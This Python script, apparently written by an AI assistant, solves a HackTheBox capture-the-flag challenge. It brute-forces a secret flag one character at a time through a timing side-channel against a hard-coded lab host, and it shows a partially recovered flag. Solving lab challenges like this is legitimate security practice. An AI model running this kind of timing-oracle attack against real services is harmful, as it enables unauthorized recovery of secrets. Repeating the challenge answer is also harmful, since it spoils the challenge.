#!/usr/bin/env python3
"""
Interactive flag extraction - continues from known prefix

Author: AI Assistant
Created: 2025-11-21
Updated: 2025-11-21 (continued from position 21)
Current Progress: HTB{Tim1ng_z@_h0ll0w_...
Auto-selects when fast character found (< 2s)
Expected time: Much faster! Worst case ~3-5 min per char, best case <1 min
Total estimate: Depends on remaining characters and their positions in charset
"""

import socket
import time
import string

HOST = "154.57.164.76"
PORT = 30777
DELAY = 8  # seconds between tests
FLAG_LENGTH = 40  # Flag is longer than 21, setting to 40 to be safe

# What we know so far (confirmed by user)
KNOWN_PREFIX = "HTB{Tim1ng_z@_h0ll0w_"  # Second 'i' in 'timing' is digit '1'

def test_char(prefix, char):
    """Test a single character"""
    guess = prefix + char
    try:
        start = time.time()
        sock = socket.socket()
        sock.settimeout(30)
        sock.connect((HOST, PORT))

        data = b''
        sock.settimeout(5)
        try:
            while b'ATTEMPT YOUR SCHEMES:' not in data:
                data += sock.recv(4096)
        except: pass

        sock.sendall((guess + '\n').encode())

        response = b''
        sock.settimeout(15)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
                if b'BANISHED' in response or b'ADVENTURE' in response: break
        except: pass

        sock.close()
        elapsed = time.time() - start

        is_success = b'CONTINUE ON WITH YOUR ADVENTURE' in response
        return elapsed, is_success

    except Exception as e:
        print(f"  ERROR: {e}")
        return None, False

def find_next_char(known):
    """Find next character using timing oracle"""
    pos = len(known)
    print(f"\n{'='*70}")
    print(f"Position {pos}: Testing after '{known}'")
    print('='*70)

    # Test uppercase first (most likely), then lowercase, then others
    charset = string.ascii_lowercase + string.digits + "_!@#$%^&*()-+=[]{}|;:,.<>?/~` " + string.ascii_uppercase 

    results = []

    for i, char in enumerate(charset):
        elapsed, is_success = test_char(known, char)

        if is_success:
            print(f"\n🎉 COMPLETE FLAG FOUND: {known + char}")
            return char, True

        if elapsed:
            results.append((char, elapsed))

            # If this is significantly faster than wrong chars (~6s), it's likely correct!
            if elapsed < 2.0:
                print(f"  [{i+1:3d}/{len(charset)}] '{char}': {elapsed:.2f}s ← FAST! Auto-selecting")
                print(f"\n✓ Found fast character: '{char}' ({elapsed:.2f}s)")
                return char, False
            else:
                print(f"  [{i+1:3d}/{len(charset)}] '{char}': {elapsed:.2f}s")

        if i < len(charset) - 1:
            time.sleep(DELAY)

    # Find fastest
    if results:
        results.sort(key=lambda x: x[1])
        fastest = results[0]

        print(f"\n{'─'*70}")
        print(f"Top 5 fastest:")
        for j, (c, t) in enumerate(results[:5]):
            print(f"  {j+1}. '{c}': {t:.2f}s")

        if len(results) > 1:
            diff = results[1][1] - fastest[1]
            print(f"\nFastest: '{fastest[0]}' at {fastest[1]:.2f}s")
            print(f"Difference from 2nd: {diff:.2f}s")

            if diff > 0.5:
                print(f"✓ Clear winner: '{fastest[0]}'")
                return fastest[0], False
            else:
                print(f"⚠ Small difference - '{fastest[0]}' is best guess")
                return fastest[0], False

    return None, False

def main():
    print("="*70)
    print("SilentOracle - Flag Extraction (Interactive)")
    print("="*70)
    print(f"Target: {HOST}:{PORT}")
    print(f"Starting from: '{KNOWN_PREFIX}'")
    print(f"Delay between tests: {DELAY}s")
    print(f"Auto-stops when fast char found (< 2s)")
    print(f"Estimated time: ~20-60 minutes (depends on char positions in alphabet)")
    print("="*70)

    known = KNOWN_PREFIX

    while len(known) < FLAG_LENGTH:
        char, complete = find_next_char(known)

        if complete:
            known += char
            break

        if char:
            known += char
            print(f"\n{'█'*70}")
            print(f"PROGRESS: {known}")
            print(f"Length: {len(known)}/{FLAG_LENGTH}")
            print(f"{'█'*70}")
        else:
            print("\n❌ Could not determine next character")
            break

    print(f"\n\n{'='*70}")
    print(f"FINAL FLAG: {known}")
    print(f"Length: {len(known)} chars")
    print(f"{'='*70}\n")

    # Save to file
    with open('flag_result.txt', 'w') as f:
        f.write(known + '\n')
    print("Flag saved to: flag_result.txt")

if __name__ == "__main__":
    main()
